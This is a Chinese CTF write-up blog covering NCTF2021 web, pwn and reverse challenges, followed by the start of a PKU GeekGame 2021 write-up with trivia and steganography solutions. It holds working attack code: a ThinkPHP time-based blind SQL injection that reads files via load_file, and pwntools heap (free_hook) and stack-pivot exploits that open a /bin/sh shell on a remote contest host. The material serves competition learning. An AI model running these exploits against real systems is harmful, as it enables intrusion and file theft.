那还是接着看他控制器吧。 application/index/controller/M1sakaM1yuu.php &lt;?php /* * @Author: m1saka@x1ct34m * @blog: www.m1saka.love */ namespace app\\index\\controller; function waf($str){ if(preg_match(\"/system| |\\*|union|insert|and|into|outfile|dumpfile|infile|floor|set|updatexml|extractvalue|length|exists|user|regexp|;/i\", $str)){ return true; } } class M1sakaM1yuu { public function index() { $username = request()-&gt;get('username/a'); $str = implode(',',$username); if (waf($str)) { return '&lt;img src=\"http://www.m1saka.love/wp-content/uploads/2021/11/hutao.jpg\" alt=\"hutao\" /&gt;'; } if($username){ db('m1saka')-&gt;insert(['username' =&gt; $username]); return '啊对对对'; } else { return '说什么我就开摆';// } } } 按理说，访问 http://129.211.173.64:8086/public/index.php/index/M1sakaM1yuu/index 应该就能到这里，但是这里不行。 为了访问到这里，特地去看了 ThinkPHP 的控制器路由，这个是驼峰命名法。 这道题里 url_convert 就设置为 true，所以就只能通过 下划线 的方式来访问了。 正如出题人的回复： 出题的时候特意定义了一个使用驼峰命名法的控制器M1sakaM1yuu，在thinkPHP官方文档中，访问的正确方式应该是index/m1saka_m1yuu/index，中间使用下划线隔开，但是兼容了index/M1sakaM1yuu/index这样的访问方式，这也是在《摆就完事了》中此访问方式能访问到的原因。但是在《摆就完事了2.0》中我加上了官方补丁取消非预期解法，官方补丁不允许路由中存在大写字母，所以会返回404。希望大家以后在开发和代码审计时能注意到这个细节。 于是应该访问 http://129.211.173.64:8086/public/index.php/index/m1saka_m1yuu/index 接下来就是 SQL 注入了。 还好出题人给了 sql 文件，可以方便复现。 DROP DATABASE IF EXISTS `nctf`; CREATE DATABASE nctf; GRANT SELECT,INSERT,UPDATE,DELETE on nctf.* to nctf@'127.0.0.1' identified by 'nctf'; GRANT SELECT,INSERT,UPDATE,DELETE on nctf.* to nctf@localhost identified by 'nctf'; GRANT ALL PRIVILEGES on *.* to nctf@'127.0.0.1' WITH GRANT OPTION; GRANT ALL PRIVILEGES on *.* to nctf@localhost WITH GRANT OPTION; flush privileges; use nctf; CREATE TABLE `m1saka` ( `id` integer(9) AUTO_INCREMENT, `username` varchar(20) NOT NULL, `password` varchar(50) NULL, `flag_in_ffllaagg.php` varchar(100) NULL, `age` int(5) NULL, PRIMARY KEY (`id`) ); INSERT INTO `m1saka` (`username`,`password`,`flag_in_ffllaagg.php`,`age`) VALUES ('m1saka','marry_dingnan','Admin',999); 这里也提示了 flag 在那个文件里。 这里复现一下，由于目前主办方没有开源题目，这里就用 DASCTF 的模板自己造一个 Dockerfile 好了。 FROM dasctfbase/web_php56_apache_mysql COPY www /var/www/html # 如需操作数据库请将 sql 文件拷贝到 /db.sql COPY www/db.sql /db.sql # 请声明对外暴露端口 EXPOSE 80 docker build -t nctf2021_bai . docker run -it -d -p 8000:80 nctf2021_bai:latest docker ps # xxxxx # 进去改 MySQL 配置 docker exec -it xxxx /bin/bash 首先需要把 MySQL 的 secure_file_prive 全局参数设为空（不是 NULL）。 设置之前，是读不到其他文件的。 限制 mysql 不允许导入 | 导出 --secure_file_prive=null 限制 mysql 的导入 | 导出 只能发生在 /tmp/ 目录下 --secure_file_priv=/tmp/ 不对 mysql 的导入 | 导出做限制 --secure_file_priv= echo 'secure_file_priv=' &gt;&gt; /etc/mysql/mysql.conf.d/mysqld.cnf 然后重启容器，这样就能读到文件了。 现在就可以访问 http://127.0.0.1:8000/public/index.php/index/m1saka_m1yuu/index?username= 进入到所需的控制器了。 接下来就是 SQL 注入环节。 对比一下官方源码，有个 EXP 的过滤给去掉了。 跟着 db('m1saka')-&gt;insert(['username' =&gt; $username]); 看 insert 所以只需要传个数组（array），然后第0个元素是 exp，第1个元素放注入的内容就完事了。 再来看 waf。 function waf($str){ if(preg_match(\"/system| |\\*|union|insert|and|into|outfile|dumpfile|infile|floor|set|updatexml|extractvalue|length|exists|user|regexp|;/i\", $str)){ return true; } } 相当于把写文件的那些都过滤掉了。再考虑到提示了是读文件，于是试着构造时间盲注。 GET /public/index.php/index/m1saka_m1yuu/index?username[0]=exp&amp;username[1]=if((select(substr(load_file(\"/var/www/html/ffllaagg.php\"),1,1))=0x3c),sleep(3),0) 先在 docker 里的 mysql 试试。 Exp: 这里本地调试，延时就设的短一点了，实际根据需要调整一下就行。（ # MiaoTony import requests import time import string url = r'http://xxxxxx:xxxx/public/index.php/index/m1saka_m1yuu/index' s = r'{}&lt;&gt;?. ' + string.ascii_letters + string.digits + r'!@#$%^&amp;*()_-+=\"\\'\\\\/' flag = '' for i in range(1, 100): for j in s: payload = f'select(substr(load_file(\"/var/www/html/ffllaagg.php\"),{i},1))={hex(ord(j))}' # print(payload) param = {'username[0]': 'exp', 'username[1]': f'if(({payload}),sleep(1.5),0)'} t = time.time() r = requests.get(url, params=param) if time.time() - t &gt; 1: flag += j print(f'[+] {i} {j} {flag}') break # username[0]=exp&amp;username[1]=if((select(substr(load_file(\"/var/www/html/ffllaagg.php\"),1,1))=0x3c),sleep(3),0) # username[0]=exp&amp;username[1]=sleep(if((select(substr(load_file(\"/var/www/html/ffllaagg.php\"),1,1))=0x3c),3,0)) 完事。 另外本地还可以把 config.php 里的 debug 和 trace 改成 true，来调试看看调用栈。 比如故意在 SQL 里加个 '，然后看看。 Pwnezheap 题目描述: 总之就是非常简单 nc 129.211.173.64 10002 附件链接: http://download.kagehutatsu.com/Download/ezheap.zip https://attachment.h4ck.fun:9000/pwn/ezheap/ezheap.zip https://nctf.slight-wind.com/pwn/ezheap/ezheap.zip 简单uaf，直接打free_hook from pwn import * context.log_level = 'debug' # sh = process('./ezheap') sh = remote('129.211.173.64',10002) def menu(choice): sh.recvuntil(\"&gt;&gt; \") sh.sendline(str(choice)) def add(size, content): menu(1) sh.recvuntil(': ') sh.sendline(str(size)) sh.recvuntil(': ') sh.send(content) def edit(idx, content): menu(2) sh.recvuntil(': ') sh.sendline(str(idx)) sh.recvuntil(': ') sh.send(content) def delte(idx): menu(3) sh.recvuntil(': ') sh.sendline(str(idx)) def show(idx): menu(4) sh.recvuntil(': ') sh.sendline(str(idx)) for i in range(30): add(0x70, b'a'*0x70) delte(0) show(0) heap_base = u64(sh.recv(8)) &lt;&lt; 12 log.success('heapbase: ' + hex(heap_base)) for i in range(1,7): delte(i) delte(7) delte(8) delte(7) for i in range(7): add(0x70,'d'*0x70) add(0x70, 'c'*0x70) edit(15, p64((heap_base + 0x290) ^ (heap_base &gt;&gt; 12))+b'\\n') add(0x70, b'a'*0x70) add(0x70, b'a'*0x70) add(0x70, p64(0) + p64(0x481) + b'\\n') delte(0) show(0) libc_base = u64(sh.recv(8)) - 0x1e0c00 log.success('libc_base: ' + hex(libc_base)) system = libc_base + 0x00000000004fa60 binsh_str = libc_base + 0x00000000001abf05 free_hook = libc_base + 0x0000000001e3e20 add(0x70, 'c'*0x70) delte(0) edit(15, p64((0) ^ (heap_base &gt;&gt; 12)) + p64(0)+b'\\n') delte(0) edit(15, p64((0) ^ (heap_base &gt;&gt; 12)) + p64(0)+b'\\n') delte(0) edit(15, p64((free_hook) ^ (heap_base &gt;&gt; 12))+b'\\n') add(0x70, b'a'*0x70) add(0x70, p64(system) + b'\\n') add(0x20, '/bin/sh\\x00') delte(15) sh.interactive() login 题目描述: Welcome, it's ez nc 129.211.173.64 10005 附件链接: http://download.kagehutatsu.com/Download/login.zip https://attachment.h4ck.fun:9000/pwn/login/login.zip https://nctf.slight-wind.com/pwn/login/login.zip 栈溢出，使用栈迁移，然后调用syscall from pwn import * # sh = process('./login') sh = remote('129.211.173.64',10005) syscall = 0x0000000000110628 close_plt = 0x401090 bin_sh_addr = 0x404800 retn_addr = 0x401220 pop_rsi_r15_ret = 0x0000000000401291 pop_rdi_ret = 0x0000000000401293 addr = 0x40128A read_plt = 0x4010A0 # gdb.attach(sh) sh.recvuntil('Welcome to NCTF2021!\\n') bss = 0x404500 main = 0x4011ED payload = b'a'*0x100 payload += p64(bss) payload += p64(main) sh.send(payload) # sh.recvuntil('Welcome to NCTF2021!\\n') sleep(0.2) payload = p64(0) + p64(1) + p64(0) + p64(0x0000000000404028) payload += p64(0x2) + p64(0x404400 + 0x38) + p64(0x401270) + p64(read_plt) payload += p64(0) + p64(1) + p64(0) + p64(0x404900) + p64(0x3b) + p64(0x404400 + 0x78) + p64(0x401270) + p64(read_plt) payload += p64(0) + p64(0x4044f8) + p64(0x4044f8) + p64(0) + p64(0) + p64(0x404400 + 0xb8) + p64(0x401270) + p64(close_plt) payload = payload.ljust(0xf8, b'a') + b'/bin/sh\\x00' sh.send(payload + p64(bss - 0x110) + p64(0x4011ED)) sleep(0.2) payload = b'a' * 0x108 + p64(0x40128A) sh.send(payload) sleep(0.5) sh.send(b'\\x28\\x56') sleep(0.5) sh.send(b'a' * 0x3b) sh.interactive() ''' 0xe6c7e execve(\"/bin/sh\", r15, r12) constraints: [r15] == NULL || r15 == NULL [r12] == NULL || r12 == NULL 0xe6c81 execve(\"/bin/sh\", r15, rdx) constraints: [r15] == NULL || r15 == NULL [rdx] == NULL || rdx == NULL 0xe6c84 execve(\"/bin/sh\", rsi, rdx) constraints: [rsi] == NULL || rsi == NULL [rdx] == NULL || rdx == NULL 0x270b3 ''' ReverseHello せかい 题目描述: 欢迎来到NCTF-逆向工程(Reverse Engineering) 这里可能有你需要的工具: ida pro 7.6 :链接：https://pan.baidu.com/s/1bV2HjBBX0bwwtzORqhErOg 提取码：o49x 附件链接: 链接：https://pan.baidu.com/s/1qPHbnzNrg-8ocG2CkYh_4w 提取码：mbxp https://attachment.h4ck.fun:9000/reverse/Hello%20%E3%81%9B%E3%81%8B%E3%81%84/WelcomeToNCTF-RE.zip https://nctf.slight-wind.com/reverse/Hello%20%E3%81%9B%E3%81%8B%E3%81%84/WelcomeToNCTF-RE.zip flag 如图所示 Shadowbringer 题目描述: One brings shadow, one brings light. Two-toned echoes, tumbling through time. Threescore wasted, ten cast aside. Four-fold knowing, no end in sight. ---EZCPP FOR YOU, JUST HAVE FUN!--- 附件链接: 链接：http://39.102.33.27:5212/#/s/rwSw https://upyun.clq0.top/Shadowbringer.exe 本质上为自制双重base64，连续修改了俩表，反过来运算即可 table = \"#$%&amp;'()*+,-.s0123456789:;&lt;=&gt;?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[h]^_`ab\" # ans_index = [8, 59, 1, 32, 7, 52, 9, 31, 24, 36, 19, 3, 16, 56, 9, 27, 8, 52, 19, 2, 8, 34, 18, 3, 5, 6, 18, 3, 15, 34, 18, 23, 8, 1, 41, 34, 6, 36, 50, 36, 15, 31,43, 36, 3, 21, 65, 65] # table = \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=\" def find_real_string(): return ''.join(table[i-1] for i in ans_index) #!/usr/bin/env python3 def myBase64Encode(preCoding): charTable = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/' #字符表 if len(preCoding) &lt; 0: return '' #字符串为空则返回空 lackCharNums = 3 - len(preCoding) % 3 if lackCharNums == 3 : lackCharNums = 0 #整除说明不缺字符 #待转换字符不是3的倍数的情况补全它 for i in range(lackCharNums) : preCoding = preCoding + b'\\x00' result = '' #用于保存最终结果的str数据 rp = '' #处理补全字符时的暂存变量 #每三个字符处理一轮 for i in range(int(len(preCoding) / 3)): threeChar = preCoding[i * 3 : i * 3 + 3] #取三个字符出来 tCode = '' #用于存放三个字符拼接后的二进制数值 文本形式 pCode = '' #暂存变量 for j in range(3) : pCode = bin(threeChar[j])[2 :] #把省略的0补上 lackZeroNums = 8 - len(pCode) #省略的0的个数 for x in range(lackZeroNums): pCode = '0' + pCode tCode = tCode + pCode pCode = '' for j in range(4): #每6位一个字符 pCode = tCode[j * 6 : j * 6 + 6] rp = rp + charTable[int(pCode, 2)] #处理补全的00字符 result = rp[: len(rp) - lackCharNums] for j in range(lackCharNums): result = result + '=' return bytes(result, encoding = \"utf-8\") def myBase64Decode(encodedBin) : charTable = \"#$%&amp;\\x27()*+,-.s0123456789:;&lt;=&gt;?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[h]^_`ab\\x00\" #字符表 #如果字符不是4的倍数 返回空 if not len(encodedBin) % 4 == 0 : return '' tCode = '' #用于存放最终的二进制文本字符串 pCpde = '' #暂存变量 #遍历encodedBin每一个字符 for i in encodedBin: for j in range(len(charTable)): #找到表中对应坐标 if chr(i) == charTable[j]: pCode = bin(j)[2 :] #转二进制去除开头的0b lackZeroNums = 6 - len(pCode) #省略的0的个数 for x in range(lackZeroNums): pCode = '0' + pCode tCode = tCode + pCode pCode = '' result = '' #储存最终结果 print(tCode) for i in range(int(len(tCode) / 8)): pCode = tCode[i * 8 : i * 8 + 8] result = result + chr(int(pCode, 2)) return bytes(result, encoding = \"utf-8\") # print(myBase64Encode(b\"helloworld\")) # print(myBase64Decode(b\"U&gt;F2UsQXN`5sXMELT=:7M_2&lt;X]^1ThaWF0=KM?9IUhAsTM5:T==_Ns&amp;&lt;Vhb!\")) tmp = b'6G074JP+s)WV:Z+T&lt;&amp;(Q18`Ks)WV:Y4hs9[h:YCS?&amp;0`' print(myBase64Decode(tmp)) 鲨鲨的秘密 题目描述: 听说这是狗狗的秘密 附件链接: 链接：http://39.102.33.27:5212/#/s/D3Un https://upyun.clq0.top/attachment_1.exe 用了一个一次执行一句话的汇编实现的CRC32，爆破即可获得答案: import zlib result = [ -1057595298, 11628042, 857318098, 1472903095, -1704694372, -1109907674, -667354223, -1914631245, 392891821, 1751113455, 740292529, 1816412822, -1587741040, 550340385, 1654029544, 739656189, 1462570906, -1370301396, 1346993615, -9781430] def find_str(index): for i in range(128): for j in range(128): tmp = bytes([i,j]) res = zlib.crc32(tmp) % (1&lt;&lt;32) if res == (result[index] % (1&lt;&lt;32)): return chr(i)+chr(j) # else: # return \"ERROR\" index = 0 ans = '' while index &lt; len(result): ans += find_str(index) index += 1 print(index) print(ans) 小结啊啊啊啊啊，这比赛 web 题目太难了吧！！！！ Misc 那个 python 过滤 ( 下的命令执行还是挺有意思的，学到了许多。 Web 咋一堆 Java 啊，欺负喵喵不会 Java，嘤嘤嘤。还有俩 XSS，一个 NodeJS 一个 Golang，本来还想做做的，试了试不会，看了提示根本没想到是啥东西，摸了，太顶了！ Reverse 有个 mobile 的题目，看 wp 应该比 web 简单，要不是他排在最后一题的位置，早知道就去看他了（害，不就是喵喵太菜了想多做几题 web，Crypto 咱也不会，唉 大家看看 web 最后的解题情况，来自群友的截图—— 最后咱拿了第12名。唉，太菜了。 （虽然最终排名第14来着，应该是有道题踩点没交上去8，问题不大 怎么说呢，本来还说想来恰烂钱的，结果啥也没恰到，好亏啊啊啊啊！ 摆烂了摆烂了。当然，还要感谢队友一起来玩。 官方 Writeup： NCTF2021 Official Writeup （GitHub archive） 还是好好学习学习。 （溜了溜了喵~","path":"2021/11/30/CTF_2021NCTF/"},{"title":"CTF | 2021 PKU GeekGame 1st WriteUp","text":"前言PKU GeekGame 来了。 北京大学信息安全综合能力竞赛 在2021年5月曾举办了具有试水性质的“第零届”竞赛，因此本届竞赛命名为第一届。 本届竞赛将继续追求 题目新颖有趣、难度具有梯度，让没有相关经验的新生和具有一定专业基础的学生都能享受比赛，在学习的过程中有所收获。 竞赛的考察内容涉及到信息安全的各个方面，主要包括： Misc: 基本技能（常见编码、信息检索利用能力等） Web: 网站安全（Web 漏洞利用、JavaScript 编程等） Binary: 二进制安全（逆向工程、程序调试等） Algorithm: 算法安全（现代密码学、算法设计等） 每道题目的考察内容可能不唯一，以上分类仅供参考。 赛程安排 比赛时间为北京时间 11 月 13 日（周六）12:00 到 20 日（周六）12:00，持续一周时间。 竞赛为个人线上解题赛，选手需要解决与安全相关的谜题获得答案。 本竞赛不专门设置报名环节，选手在比赛结束前可以自由登录本平台 geekgame.pku.edu.cn 参赛。 本届竞赛将分为两个阶段，时长分别为 5 天和 2 天。在第二阶段将放出提示或降低难度，同时在此阶段解出题目将只能获得 1/4 的分数。通过第二阶段，希望思路卡壳的选手能够借助提示不留遗憾，同时萌新也有机会挑战难题。 比赛时间表： 13 日（周六）12:00：比赛开始，题目将在前两天内分批放出 18 日（周四）12:00：比赛进入第二阶段，将放出提示或降低难度，在此阶段获得的分数将减少 20 日（周六）12:00：比赛结束，将无法再提交答案，题目环境将继续开放 21 日（周日）22:00 前：校内排名前 35 名的选手需要提交每道解出题目的解题报告（Writeup） 比赛结束后：将举办颁奖典礼，并公开官方 Writeup 和部分优秀选手 Writeup USTC Hackergame 结束了，北大的第一届 GeekGame 来了。然而总共举办的次数并不是1而是2，因为是从0开始的（23333 想着 hackergame 没好好打，于是就来这个比赛看看题了呗。结果一打自闭好几天，麻了。 本来这篇 writeup 应该比赛结束就发的，但是还想着复现几个题于是就咕了，但是后来发现也没啥时间复现了，咕了好久想想还是直接发了吧（（（ →签到←https://geekgame.pku.edu.cn/media/prob01_lwzltdrojur150zq.zip?token=xxx 编辑文字，把里面内容复制出来，然后俩栅栏手工补一下。 fa{aeAGetTm@ekaev! lgHv__ra_ieGeGm_1} flag{Have_A_Great_Time@GeekGame_v1!} 花絮 有天在实验室，有个学弟来看了看题目，本来想签个到的，发现怎么都整不出来，然后找到了 喵喵之前写的一篇 wp，找到了当时比对字体的网站，然后比对到了用的 Wingdings 字体，但是发现 pdf 不全，于是没签上到（摊手.jpg 小北问答 Remake You 酱善于使用十种搜索引擎，别人不清楚的知识她能一秒钟搜索出来。这是众人皆知的事实。 You 酱的朋友菜宝在刷往年题的时候找到了一份没有答案的资料。她本想询问 You 酱，但听说 You 酱已经早在 5 月份就把课程辅导这项业务外包给了你。 于是，现在菜宝手持两枚 Flag，希望你能帮她解答这些题目。你每小时可以提交一次答案，答对至少一半可以获得第一个 Flag，全部答对可以获得第二个 Flag。 #1 北京大学燕园校区有理科 1 号楼到理科 X 号楼，但没有理科 (X+1) 号及之后的楼。X 是？ 答案格式： ^\\d+$ 5 #2 上一届（第零届）比赛的总注册人数有多少？ 答案格式：^\\d+$ 竞赛采取个人线上赛的形式，从5月16日至23日，在CTF赛制的基础上加入一定的基础知识竞赛等内容，共设17道信息安全综合能力竞赛题。本次大赛共有407人注册参赛，有效选手334人。历经七天的紧张比赛，大赛共决出一等奖三名、二等奖七名、三等奖二十名、新生特别奖三名、“一血奖”十七人次。 via 北京大学举办首届信息安全综合能力竞赛 407 #3 geekgame.pku.edu.cn 的 HTTPS 证书曾有一次忘记续期了，发生过期的时间是？ 答案格式： ^2021-\\d\\d-\\d\\dT\\d\\d:\\d\\d:\\d3\\+08:00$ https://crt.sh/?q=geekgame.pku.edu.cn https://crt.sh/?id=4362003382 2021-07-11T08:49:53+08:00 #4 2020 年 DEFCON CTF 资格赛签到题的 flag 是？ 答案格式：^.+{.+}$ https://archive.ooo/c/welcome-to-dc2020-quals/358/ https://s3.us-west-2.amazonaws.com/archive-ooo-public/public_files/7ea9b08d24b9ab179e901316db875cd3c08f27de29b8f8152ce298e26a2961be/welcome.txt OOO{this_is_the_welcome_flag} #5 在大小为 672328094 * 386900246 的方形棋盘上放 3 枚（相同的）皇后且它们互不攻击，有几种方法？ 答案格式： ^\\d+$ 这题硬是到了最后一天也没懂怎么做。。把三（n）皇后问题看了又看，怎么一堆 DFS 回溯啥的，喵喵好菜啊不懂算法，呜呜。（感觉是有必要学学算法了 而且，一直在想不是 n*n 这种正方形的情况该怎么解好啊……摸了。 （猜了 114514，1145141919810，发现都不是 BTW, 嘉然啊…… 第二阶段提示 不同的领域有不同的专业工具。你可能无法一下找到答案，但是你能找到一个工具，然后用这个工具得到答案。这个工具可能是某个信息公开系统，可能是某个资料存档，可能是某个在线查询服务。而对于整数数列构成的数学问题来说，这个著名的工具是…… 整数数列构成的数学问题，当时没想到，只是谷歌查了 三个皇后，没查到，gg。 赛后才知道原来说的是 OEIS，The On-Line Encyclopedia of Integer Sequences® (OEIS®) 搜索 3 queens 就能找到这个 A047659 Number of ways to place 3 nonattacking queens on an n X n board. In general, for m &lt;= n, n &gt;= 3, the number of ways to place 3 nonattacking queens on an m X n board is n^3/6*(m^3 - 3*m^2 + 2*m) - n^2/2*(3*m^3 - 9*m^2 + 6*m) + n/6*(2*m^4 + 20*m^3 - 77*m^2 + 58*m) - 1/24*(39*m^4 - 82*m^3 - 36*m^2 + 88*m) + 1/16*(2*m - 4*n + 1)*(1 + (-1)^(m+1)) + 1/2*(1 + abs(n - 2*m + 3) - abs(n - 2*m + 4))*(1/24*((n - 2*m + 11)^4 - 42*(n - 2*m + 11)^3 + 656*(n - 2*m + 11)^2 - 4518*(n - 2*m + 11) + 11583) - 1/16*(4*m - 2*n - 1)*(1 + (-1)^(n+1))) [Panos Louridas, idee &amp; form 93/2007, pp. 2936-2938]. - Vaclav Kotesovec, Feb 20 2016 #6 上一届（第零届）比赛的“小北问答1202”题目会把所有选手提交的答案存到 SQLite 数据库的一个表中，这个表名叫？ https://github.com/PKU-GeekGame/geekgame-0th/blob/main/src/choice/game/db.py submits #7 国际互联网由许多个自治系统（AS）组成。北京大学有一个自己的自治系统，它的编号是？ 答案格式： ^AS\\d+$ https://bgp.he.net/search?search%5Bsearch%5D=Peking+University&amp;commit=Search AS59201 #8 截止到 2021 年 6 月 1 日，北京大学信息科学技术学院下属的中文名称最长的实验室叫？ 答案格式： ^.{15,30}(实验室|中心)$ 信息科学技术学院2022年招生指南 区域光纤通信网与新型光通信系统国家重点实验室 flag{JiU-Cong-Xian-Zai-Kai-SHi} 叶子的新歌 “叶子又发新歌了。” 叶子是小雨的好朋友，最近想成为四轱辘爱抖露所以沉迷写歌，但由于资质太过平庸，他写的歌并没有什么人听。每当他在无人问津的阴雨霉湿之地，和着雨音，唱着没有听众的歌曲的时候，也不会有人因为他的歌声而在路上拦住他说：太好汀了⑧！ 不过毕竟，叶子是小雨最好最好的朋友，小雨还是决定听一听叶子的新歌。但是她总感觉，叶子似乎在歌里藏了一些东西。 “是想对我说的话吗？” 小雨决定找出歌里藏着的三个Flag。 夢は時空を越えて Secret in Album Cover!! lsb Aztec 条码 https://products.aspose.app/barcode/zh-hans/recognize/aztec#/recognized Gur frperg va uvfgbtenz. ROT13 The secret in histogram. 草 直方图。。 然而太不清晰了……没办法怎么都扫不出来。（赛后才知道其实是反色了） 最后不行还得上py from PIL import Image import binascii import cv2 import numpy as np from matplotlib import pyplot as plt image = cv2.imread(\"1.png\") colors = ('b', 'g', 'r') for n, color in enumerate(colors): hist = cv2.calcHist([image], [n], None, [256], [0, 256]) plt.plot(hist, color=color) print(hist) plt.xlim([0, 256]) plt.show() hist2 = ['1' if h[0] == 8196.0 else '0' for h in hist] hist3 = ['0' if h[0] == 8196.0 else '1' for h in hist] d2 = ''.join(hist2) d3 = ''.join(hist3) print(d3) # 1110100011000001111100010001001111100111101001000001101110001011001111110011000110001111011100010010000011001111110110011000001000111010011110001100010011000011110010000110000110011111000100100010000100111000010001011100000111001100011100111000011110010110 target = Image.new('RGBA', (300, 300), color=0) for x in range(len(d3)): for y in range(200): if d3[x] == '1': target.putpixel((x, y), (255, 255, 255, 255)) else: target.putpixel((x, y), (0, 0, 0, 255)) target.show() target.save('barcode.png') 扫码得到 xmcp.ltd/KCwBa 访问 你还记得高中的时候吗？那时在市里的重点中学，我们是同桌。我以前还怪讨人嫌的，老是惹你生气，然后你就不和我说话，我就死乞白赖地求你，或者讲笑话逗你。 不过，你笑起来好可爱，从小就好可爱。此后的一切，也都是从那个笑容开始的吧。 真的，好想回到那个时候啊。 Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook! Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook! Ook! Ook! Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook. Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. 